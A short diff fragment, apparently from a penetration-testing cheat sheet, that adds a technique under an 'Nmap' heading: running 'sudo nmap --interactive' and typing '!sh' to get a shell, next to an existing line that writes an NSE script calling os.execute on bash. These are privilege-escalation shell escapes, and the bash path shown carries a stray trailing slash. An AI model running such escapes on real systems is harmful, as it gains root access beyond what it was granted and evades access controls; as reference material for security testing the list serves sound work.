@@ -211,6 +211,10 @@ Nmap
 ```
 echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
 ```
+```
+$ sudo nmap --interactive
+> !sh
+```
 
 Env
 ```
